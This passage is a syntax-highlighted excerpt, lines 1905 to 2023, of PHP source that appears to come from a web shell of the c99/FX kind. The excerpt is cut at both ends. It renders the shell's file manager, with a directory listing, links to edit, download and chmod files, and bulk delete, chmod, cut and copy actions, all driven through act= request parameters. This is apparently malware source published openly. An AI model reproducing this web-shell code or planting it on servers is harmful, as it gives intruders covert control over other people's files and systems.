<span class="lineno">1905</span>           <span class="nv">$ud</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">1906</span>           <span class="nv">$uv</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1907</span>           <span class="nv">$row</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1908</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1909</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=small_dir</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt; &quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1910</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;CURDIR&quot;</span><span class="p">;</span>
<span class="lineno">1911</span>           <span class="p">}</span>
<span class="lineno">1912</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1913</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_lnk</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt; &quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1914</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;UPDIR&quot;</span><span class="p">;</span>
<span class="lineno">1915</span>           <span class="p">}</span>
<span class="lineno">1916</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1917</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1918</span>               <span class="nv">$disppath</span> <span class="o">.=</span> <span class="s2">&quot; =&gt; &quot;</span><span class="o">.</span><span class="nb">readlink</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1919</span>               <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;LNK&quot;</span><span class="p">;</span>
<span class="lineno">1920</span>               <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_lnk</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt; [&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1921</span>             <span class="p">}</span>
<span class="lineno">1922</span>             <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1923</span>               <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;DIR&quot;</span><span class="p">;</span>
<span class="lineno">1924</span>               <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=small_dir</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt; [&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1925</span>             <span class="p">}</span>
<span class="lineno">1926</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
<span class="lineno">1927</span>           <span class="p">}</span>
<span class="lineno">1928</span>           <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1929</span>             <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
<span class="lineno">1930</span>             <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1931</span>             <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
<span class="lineno">1932</span>             <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
<span class="lineno">1933</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt; &quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1934</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno">1935</span>           <span class="p">}</span>
<span class="lineno">1936</span>           <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno">1937</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="p">}</span>
<span class="lineno">1938</span>           <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1939</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1940</span>             <span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">ls_reverse_all();</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1941</span>             <span class="nv">$i</span><span class="o">--</span><span class="p">;</span>
<span class="lineno">1942</span>           <span class="p">}</span>
<span class="lineno">1943</span>           <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1944</span>             <span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">actbox&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1945</span>           <span class="p">}</span>
<span class="lineno">1946</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1947</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$checkbox</span><span class="s2"> &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=d&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_diz</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt; &quot;</span><span class="p">;</span>
<span class="lineno">1948</span>           <span class="p">}</span>
<span class="lineno">1949</span>           <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1950</span>             <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$checkbox</span><span class="s2"> &quot;</span><span class="o">.</span>
<span class="lineno">1951</span>                      <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_diz</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt; &quot;</span><span class="o">.</span>
<span class="lineno">1952</span>                      <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=change</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Edit</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt; &quot;</span><span class="o">.</span>
<span class="lineno">1953</span>                      <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=download&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=download</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Download</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1954</span>           <span class="p">}</span>
<span class="lineno">1955</span>           <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1956</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1957</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1958</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1959</span>           <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1960</span>         <span class="p">}</span>
<span class="lineno">1961</span>       <span class="p">}</span>
<span class="lineno">1962</span>       <span class="c1">#Listing Files &amp; Folders</span>
<span class="lineno">1963</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;div class=barheader&gt;.: &quot;</span><span class="p">;</span>
<span class="lineno">1964</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fx_infohead</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$fx_infohead</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1965</span>       <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;Directory List (&quot;</span><span class="o">.</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">])</span><span class="o">+</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot; folders)&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1966</span>       <span class="k">echo</span> <span class="s2">&quot; :.&lt;/div&gt;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1967</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">ls_form</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="si">$surl\</span><span class="s2">&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="nx">POST</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;.</span>
<span class="lineno">1968</span> <span class="s2">           &quot;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">act</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$dspact\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;.</span>
<span class="lineno">1969</span> <span class="s2">           &quot;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">d</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$d\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1970</span> <span class="s2">?&gt;</span>
<span class="lineno">1971</span> 
<span class="lineno">1972</span> 
<span class="lineno">1973</span> <span class="s2">&lt;table class=&quot;</span><span class="nx">explorer</span><span class="s2">&quot;&gt;</span>
<span class="lineno">1974</span> <span class="s2">&lt;?php</span>
<span class="lineno">1975</span> <span class="s2">      </span><span class="si">$table</span><span class="s2"> = array_merge(</span><span class="si">$tab[&quot;cols&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;head&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;folders&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;links&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;files&quot;]</span><span class="s2">);</span>
<span class="lineno">1976</span> <span class="s2">      foreach(</span><span class="si">$table</span><span class="s2"> as </span><span class="si">$row</span><span class="s2">) {</span>
<span class="lineno">1977</span> <span class="s2">        echo &quot;</span><span class="nx">\t</span><span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1978</span> <span class="s2">        foreach(</span><span class="si">$row</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) { echo &quot;</span><span class="o">&lt;</span><span class="nx">td</span><span class="o">&gt;</span><span class="s2">&quot;.</span><span class="si">$v</span><span class="s2">.&quot;</span><span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;</span><span class="s2">&quot;; }</span>
<span class="lineno">1979</span> <span class="s2">        echo &quot;</span><span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1980</span> <span class="s2">      }</span>
<span class="lineno">1981</span> <span class="s2">?&gt;</span>
<span class="lineno">1982</span> 
<span class="lineno">1983</span> 
<span class="lineno">1984</span> <span class="s2">&lt;/table&gt;</span>
<span class="lineno">1985</span> <span class="s2">&lt;div align=&quot;</span><span class="nx">right</span><span class="s2">&quot;&gt;</span>
<span class="lineno">1986</span> <span class="s2">    &lt;script language=&quot;</span><span class="nx">javascript</span><span class="s2">&quot;&gt;</span>
<span class="lineno">1987</span> <span class="s2">    function ls_setcheckboxall(status) {</span>
<span class="lineno">1988</span> <span class="s2">      var id = 1; var num = &lt;?php echo(count(</span><span class="si">$table</span><span class="s2">) - 2); ?&gt;;</span>
<span class="lineno">1989</span> <span class="s2">      while (id &lt;= num) {</span>
<span class="lineno">1990</span> <span class="s2">        document.getElementById(&#39;actbox&#39;+id).checked = status; id++;</span>
<span class="lineno">1991</span> <span class="s2">      }</span>
<span class="lineno">1992</span> <span class="s2">    }</span>
<span class="lineno">1993</span> <span class="s2">    function ls_reverse_all() {</span>
<span class="lineno">1994</span> <span class="s2">      var id = 1; var num = &lt;?php echo(count(</span><span class="si">$table</span><span class="s2">) - 2); ?&gt;;</span>
<span class="lineno">1995</span> <span class="s2">      while (id &lt;= num) {</span>
<span class="lineno">1996</span> <span class="s2">        document.getElementById(&#39;actbox&#39;+id).checked = !document.getElementById(&#39;actbox&#39;+id).checked; id++;</span>
<span class="lineno">1997</span> <span class="s2">      }</span>
<span class="lineno">1998</span> <span class="s2">    }</span>
<span class="lineno">1999</span> <span class="s2">    &lt;/script&gt;</span>
<span class="lineno">2000</span> <span class="s2">    &lt;input type=&quot;</span><span class="nx">button</span><span class="s2">&quot; onclick=&quot;</span><span class="nx">ls_setcheckboxall</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="s2">&quot; value=&quot;</span><span class="nx">Check</span> <span class="nx">all</span><span class="s2">&quot;&gt;</span>
<span class="lineno">2001</span> <span class="s2">    &lt;input type=&quot;</span><span class="nx">button</span><span class="s2">&quot; onclick=&quot;</span><span class="nx">ls_setcheckboxall</span><span class="p">(</span><span class="k">false</span><span class="p">);</span><span class="s2">&quot; value=&quot;</span><span class="nx">Uncheck</span> <span class="nx">all</span><span class="s2">&quot;&gt;</span>
<span class="lineno">2002</span> <span class="s2">&lt;?php</span>
<span class="lineno">2003</span> <span class="s2">      if (count(array_merge(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">,</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">)) &gt; 0) {</span>
<span class="lineno">2004</span> <span class="s2">        echo &quot;</span><span class="nx">\t</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actarcbuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Archive it!</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span>
<span class="lineno">2005</span>              <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actarcbuff_path</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">fx_archive_&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)),</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.tar.gz</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2006</span>              <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actpastebuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Paste</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2007</span>              <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actemptybuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Empty buffer</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2008</span>       <span class="p">}</span>
<span class="lineno">2009</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n\t</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2010</span>            <span class="s2">&quot;&lt;select name=act&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2011</span>              <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$act</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;With checked:&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2012</span>       <span class="nv">$f_acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;delete&quot;</span><span class="p">,</span><span class="s2">&quot;chmod&quot;</span><span class="p">,</span><span class="s2">&quot;cut&quot;</span><span class="p">,</span><span class="s2">&quot;copy&quot;</span><span class="p">,</span><span class="s2">&quot;unselect&quot;</span><span class="p">);</span>
<span class="lineno">2013</span>       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$f_acts</span> <span class="k">as</span> <span class="nv">$f1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2014</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option value=</span><span class="se">\&quot;</span><span class="si">$f1\</span><span class="s2">&quot;&quot;.(</span><span class="si">$dspact</span><span class="s2"> == &quot;</span><span class="nv">$f1</span><span class="s2">&quot;?&quot;</span> <span class="nx">selected</span><span class="s2">&quot;:&quot;&quot;).&quot;</span><span class="o">&gt;</span><span class="nv">$f1</span><span class="o">&lt;/</span><span class="nx">option</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">2015</span> <span class="s2">      }</span>
<span class="lineno">2016</span> <span class="s2">      ?&gt;</span>
<span class="lineno">2017</span> 
<span class="lineno">2018</span> 
<span class="lineno">2019</span> <span class="s2">    &lt;/select&gt;</span>
<span class="lineno">2020</span> <span class="s2">    &lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">Confirm</span><span class="s2">&quot;&gt;</span>
<span class="lineno">2021</span> <span class="s2">&lt;/div&gt;</span>
<span class="lineno">2022</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">2023</span> <span class="s2">&lt;?php</span>
